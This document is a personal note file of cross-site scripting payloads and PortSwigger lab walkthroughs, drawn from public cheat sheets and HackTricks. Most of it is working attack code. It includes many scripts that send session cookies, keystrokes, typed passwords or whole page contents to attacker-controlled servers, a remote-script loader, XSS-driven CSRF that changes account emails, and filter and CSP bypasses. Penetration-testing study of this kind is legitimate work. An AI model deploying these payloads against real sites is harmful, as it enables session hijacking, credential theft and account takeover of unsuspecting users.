https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
PDF XSS : https://drive.google.com/file/d/1nsDVQufUY1KRxA6tGgSlp4infmuQEIfp/view
Burp Pro Deep Active Scan detects simple Reflected XSS:
![[Pasted image 20240229102907.png]]
Also DOM Based Basic
![[Pasted image 20240229105537.png]]
Send TO Victim Payloads:
```
<iframe src="https://0ae8000403c2b63d86144f3a00cb009a.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

<script>
location="https://0aa8009904d13c3980295dc300300029.web-security-academy.net/?search=<xss autofocus tabindex=1 onfocusin=alert(document.cookie)></xss>"
</script>

<img src=x onerror=fetch('http://10.10.16.40/'+document.cookie);>

(stored)
<script>
location="https://burpcolaborator/?leaked=" + document.cookie;
</script>

<a href=# onclick="window.open('https://0aa8009904d13c3980295dc300300029.web-security-academy.net/?search=<xss autofocus tabindex=1 onfocusin=alert(document.cookie)></xss>')">XSS</a>" (user interaction required)

(create a form and fetch passwd)
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">



Load Remote JS:
<img SRC=x onerror="var script1 = document.createElement('script'); script1.src = 'http://oastify.com'; document.head.appendChild(script1);"/>

```
Payloads
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<img src=1 oNeRrOr=alert`1`>

In HTTP-Smuggling f.e:
User-Agent: "><script>alert(document.cookie);var x=new
XMLHttpRequest();x.open("GET","https://<exploit-server>/"+document.cookie);x.send();</script>


(attribute with angle brackets encoded)
j1kde"onfocus="alert(1)"autofocus="ava00 
"onmouseover="alert(1)

(javascript string with angle brackets encoded):
17762';alert(1)//824
'-alert(1)-'

backslash instead of encoding:
(var tracker={track(){}};tracker.track('http://pito.com');-alert(1)//');)
http://pito.com?&apos;-alert(1)-&apos;
http://pito.com&#39;);-alert(1)//

template literals with encodings:
${alert(1)}
also magic polyglot:
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->


Base64 :
'document.location='https://<exploit-server>/?c='+document.cookie -> to base64

Final payload:
<iframe src="https://<xss url>/?searchterm=%27%3Cbody%20onload=%22eval(atob('base64
encoded'))%22%3E//" onload="this.onload='';this.src+='#XSS'"></iframe>
```
HTML ENCODINGS:
https://www.degraeve.com/reference/specialcharacters.php
DOM
```
-> location.search query + Document.write (Burp Scan)
window.location.search)).get('search')
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
payload = '"><script>alert(1)</script>

-> location.search + innert.html (Burp Scan)
query = (new URLSearchParams(window.location.search)).get('search')
document.getElementById('searchMessage').innerHTML = query;
payload = <img src=x onerror=alert(1)>

-> jquery anchor href + location.search (Burp Scan)
href", (new URLSearchParams(window.location.search)).get('returnPath'));
payload = ?returnPath=javascript:alert(document.cookie)

-> hashchange event in jquery (Burp Scan)
hashchange', function(){ var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')')
payload = https://.../#<img src=1 onerror=alert(1)>

-> document.write with location.search param
&storeId="><script>alert(1)</script>

-> angular JS prior to 1.8 vulnerable to:
{{constructor.constructor('alert(1)')()}}

-> html.replace('<', '&lt;').replace('>', '&gt;'); in a string, single occurrence
<><img src=x onerror=alert(1)>
```

More elaborated DOM:
![[Pasted image 20240303164438.png]]
```
\"}-alert(1)//
"}; location="https://exploit-0a0500a0045f599884e00d6001da00b1.exploit-server.net/c?"+document.cookie; //
```

Stored:
```
Check for hrefs: javascript:alert(1)
Check for str.replace: <> <img...
```

Banned tags:
use brute force of tag, and event with the cheatlist
![[Pasted image 20240303170455.png]]

Custom Tags:
![[Pasted image 20240303233054.png]]
```
<custom-tag onmouseover=alert(1)> (user interaction)
<xss id=x onmouseover=alert(document.cookie) tabindex=1> (user interaction)
GOD:
<xss autofocus tabindex=1 onfocusin=alert(document.cookie)></xss>
<custom-tag autofocus tabindex=1 onfocusin=alert(document.cookie)></xss>

svg markup:
<svg><animatetransform onbegin=alert(1) attributeName=x dur=1s>
```

Custom exceptions:
```
-> <link rel="canonical" href="https://example.com/page" />
Param reflected ex: <link rel="canonical" href="https://example.com/page?param" />
?'accesskey='x'onclick='alert(1) (required ALT+X /  ALT+SHIFT+X)
```
![[Pasted image 20240304112343.png]]
XSS + CSRF
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```




----- Hacktricks XSS----
```
<img src=x onerror=fetch(`https://COLLABORATOR.com?collector=`+btoa(document.cookie))>

<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>

<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">

<svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>

<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>

<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>

<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>

<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>

<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>

<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>

<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>

<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>

<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>

<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>

<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>

<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>

<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>

<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>

<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>

<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>

Encode the following to base64
'document.location='https://<exploit-server>/?c='+document.cookie
J2RvY3VtZW50LmxvY2F0aW9uPSdodHRwczovL2V4cGxvaXQtPGNoYW5nZW1lPi53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQvP2M9Jytkb2N1bWVudC5jb29raWU=
Final payload:
<iframe src="https://<xss url>/?searchterm='<body onload="eval(atob('base64-encoded'))">//" onload="this.onload='';this.src='#XSS'"></iframe>


Steal page Contents:
<script>
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
var attacker = "http://10.10.14.8/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.withCredentials = true;
xhr.send(null);
</script>

<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0ace007d04bcb93880c3ee7000dc00a5.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
	fetch('https://exploit-0a9200830416b9a78023edee01d4008e.exploit-server.net/'+this.responseText);
};
</script>


<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0ace007d04bcb93880c3ee7000dc00a5.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
	location='https://exploit-0a9200830416b9a78023edee01d4008e.exploit-server.net/'+this.responseText;
};
</script>
```

Labs Stuff: ---------------------------------------------------------------
##### Stored xss on comment that sends us the cookie to our server
```
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>

1. <img src=x onerror=this.src="http://<IP>:80/?cookie="+btoa(document.cookie) />
    

<script>document.location='http://<IP>grabber.php?c='+btoa(document.cookie)</script>

<img src=x onerror='document.onkeypress=function(e){fetch("http://<IP>?k="+String.fromCharCode(e.which))},this.remove();'>
    
<!--[CDATA[BPP-Informe Banca Personal_02<br--><<img src=x onerror="this.src="[http://ip/?cookie="+btoa(document.cookie)">>2](http://ip/?cookie=%22+btoa(document.cookie)%22%3E%3E2 "http://ip/?cookie="+btoa(document.cookie)">>2") Alerts]]>
```
##### DOM XSS document.write sink using source location.search

```
Enter a random alphanumeric string into the search box.
Right-click and inspect the element, and observe that your random string has been placed inside an img src attribute.

Break out of the img attribute by searching for:
"><svg onload=alert(1)>
```
Basically trunking this img src ![[Pasted image 20230928120941.png]]

##### DOM XSS in innerHTML using location.search
```
Bascially when you give a script tag it accepts it but does not activate, then use an invalid image that throws an error, AKA alert.
<img src=1 onerror=alert(1)>
```


##### DOM XSS in jQuery anchor href attribute sink using location.search source
in the back page button we find
![[Pasted image 20230929093809.png]]
![[Pasted image 20230929093753.png]]
href determines the returnpath
Use javascript: as an anchor to execute code
```
javascript:alert(document.cookie)
```



##### DOM XSS in jQuery selector sink using a hashchange event
location.hash takes the # input after the URL
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
Basically we are appending to a body request the url of the page we want to redirect with a # at the end, after, on the load of the page we append to the # an invalid image src, throwing an error, that could be an alert or a print javascript function


##### Reflected XSS breaking attribute with angle brackets
```
kraken" onmouseover='alert()'
```

![[Pasted image 20230929224731.png]]
![[Pasted image 20230929224822.png]]
Basically we closed quotes and inside the input flag we appended a onmouseover alert, when you move the mouse now on the letterbox you get the alert


##### Stored XSS into anchor href attribute with double quotes HTML-encoded
![[Pasted image 20230930230400.png]]
```
javascript:alert()
```
![[Pasted image 20230930230857.png]]



##### Reflected XSS into a JavaScript string with angle brackets HTML encoded
When angle brackets are encoded on a string:
![[Pasted image 20231001225657.png]]
Try:
```
'-alert(1)-'
'+alert(1)+'
'; alert(1) ;'
'; alert(1) ;let myVar='test
```
![[Pasted image 20231001230203.png]]

##### DOM XSS in document.write sink using source location.search inside a select element
```
var store = (new URLSearchParams(window.location.search)).get('storeId'); document.write('<select name="storeId">');
```
location.search gets the param on the URL
![[Pasted image 20231002152907.png]]
![[Pasted image 20231002152918.png]]
In this case we are asking for the storeId parameter
```
https://0af900d104ce4be181fd6b6e003b00fe.web-security-academy.net/product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
```

##### AngularJS relfected XSS
```
{{constructor.constructor('alert(1)')()}}
```

##### JSON strings escape XSS on eval javascript function with double quotes html encoded
```
\"+alert(1)}//
```
Note that we need to comment the rest of the JSON query


##### replace function bypass
```
   function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```

```
<><img src=1 onerror=alert(1)>
```


##### Onresize & onload
```
<iframe src="https://0a130068037f074c80268b4800b10097.web-security-academy.net/?search="><body onresize=print()>" onload=this.style.width='100px'>
```
##### ByPass WAF XSS
```

Inject a standard XSS vector, such as:
<img src=1 onerror=print()>
Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.
Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.
In Burp Intruder, in the Positions tab, replace the value of the search term with: <>
Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: <§§>
Visit the XSS cheat sheet and click "Copy tags to clipboard".
In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".
When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the body payload, which caused a 200 response.

Go back to the Positions tab in Burp Intruder and replace your search term with:
<body%20=1>
Place the cursor before the = character and click "Add §" twice, to create a payload position. The value of the search term should now look like: <body%20§§=1>
Visit the XSS cheat sheet and click "copy events to clipboard".
In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".
When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the onresize payload, which caused a 200 response.

Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
Click "Store" and "Deliver exploit to victim".
```

##### Customs Tags
Searching for what custom tag executes an xss on https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#special-tags
```
<xss autofocus tabindex=1 onfocusin=alert(1)></xss>
```
Deliver the exploit
```
<iframe src="https://0aa8009904d13c3980295dc300300029.web-security-academy.net/?search=<xss autofocus tabindex=1 onfocusin=alert(document.cookie)></xss>" onload=this.style.width='100px'>
```
But iframe shows this
![[Pasted image 20231020110719.png]]
So we try another
```
<a href=# onclick="window.open('https://0aa8009904d13c3980295dc300300029.web-security-academy.net/?search=<xss autofocus tabindex=1 onfocusin=alert(document.cookie)></xss>')">XSS</a>"
```
Tried but requires use interaction
So we need to find something that pops imediately
Maybe a redirect?
![[Pasted image 20231020111212.png]]
Sucess
```
<script>
location="https://0aa8009904d13c3980295dc300300029.web-security-academy.net/?search=<xss autofocus tabindex=1 onfocusin=alert(document.cookie)></xss>"
</script>
```


##### SVG TAGS
```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```


##### Reflected XSS into a JavaScript string with single quote and backslash escaped

```
\\
\' 
</script><script>alert(1)</script>
```


##### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-using-html-quote-encapsulation
```
< encoded
"" encoded
\'
\'-alert(1)//
\'+alert(1)//
\';alert(1)//
\";alert(1);//
```

##### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
```
<> "" encoded
\ ' escaped
&    &amp;
<    &lt;
>    &gt;
"    &quot;
'    &#x27;
http://payload2&#x27;-alert(1)-&#x27;
```


##### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
![[Pasted image 20231026102309.png]]
```
We can use the following payload to break out the variable:
${alert(1)}
```


##### Steal Cookie, reflected XSS
```ruby
<script>
fetch('https://qc6a4hfvht6z3o8ylr7i63bn7ed51wpl.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

##### Steal Username And Password
```ruby
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://a8jw0ge9t7jzzy1td80aegzf86ex2oqd.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```


##### Exploiting XSS to perform CSRF

```ruby
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```


##### Reflected XSS with AngularJS escaped
There are a few payloads to escape the AngularJS on the port swigger cheat sheet, this worked for me:
```
?search=1&toString().constructor.prototype.charAt%3D[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```


##### Reflect XSS with AngularJS sandbox escape and CSP
Any of the exploits in the cheat sheet worked:
```
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';

encode URL in cyberchef and deliver to victim in an exploit like:

<script>
location='http://labID/idk/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';'
</script>

```


##### Reflected XSS with event handlers and href attributes blocked
![[Pasted image 20231026124137.png]]
![[Pasted image 20231026124242.png]]
Create an svg object, defined by a text, and with the tag animate set the a link to alert
XSS on animated tag
```
dosn't work:
<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>

works:
<svg><a><animate attributeName=href values=javascript:alert(1) />id=xss><text x=20 y=20>XSS</text></a>
<svg><a id=xss><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>CLICK HERE</text></a>
```


##### Reflected XSS in a JavaScript URL with some characters blocked
![[Pasted image 20231026124736.png]]
```
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```


##### Reflected XSS protected by very strict CSP, with dangling markup attack

```
Log in to the lab using the account provided above.
Examine the change email function. Observe that there is an XSS vulnerability in the email parameter.
Go to the Collaborator tab.
Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.

Back in the lab, go to the exploit server and add the following code, replacing YOUR-LAB-ID and YOUR-EXPLOIT-SERVER-ID with your lab ID and exploit server ID respectively, and replacing YOUR-COLLABORATOR-ID with the payload that you just copied from Burp Collaborator.
```

```
<script>
if(window.name) {
		new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
		} else {
     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```

```
Click "Store" and then "Deliver exploit to victim". When the user visits the website containing this malicious script, if they click on the "Click me" link while they are still logged in to the lab website, their browser will send a request containing their CSRF token to your malicious website. You can then steal this CSRF token using Burp Collaborator.
Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see an HTTP interaction that was initiated by the application. Select the HTTP interaction, go to the request tab, and copy the user's CSRF token.
With Burp's Intercept feature switched on, go back to the change email function of the lab and submit a request to change the email to any random address.
In Burp, go to the intercepted request and change the value of the email parameter to hacker@evil-user.net.
Right-click on the request and, from the context menu, select "Engagement tools" and then "Generate CSRF PoC". The popup shows both the request and the CSRF HTML that is generated by it. In the request, replace the CSRF token with the one that you stole from the victim earlier.
Click "Options" and make sure that the "Include auto-submit script" is activated.
Click "Regenerate" to update the CSRF HTML so that it contains the stolen token, then click "Copy HTML" to save it to your clipboard.
Drop the request and switch off the intercept feature.
Go back to the exploit server and paste the CSRF HTML into the body. You can overwrite the script that we entered earlier.
Click "Store" and "Deliver exploit to victim". The user's email will be changed to hacker@evil-user.net.
```


###### Reflected XSS protected by CSP, with CSP bypass
```

Enter the following into the search box:
    <img src=1 onerror=alert(1)>
Observe that the payload is reflected, but the CSP prevents the script from executing.
In Burp Proxy, observe that the response contains a Content-Security-Policy header, and the report-uri directive contains a parameter called token. Because you can control the token parameter, you can inject your own CSP directives into the policy.

Visit the following URL, replacing YOUR-LAB-ID with your lab ID:
    https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27

The injection uses the script-src-elem directive in CSP. This directive allows you to target just script elements. Using this directive, you can overwrite existing script-src rules enabling you to inject unsafe-inline, which allows you to use inline scripts.
```
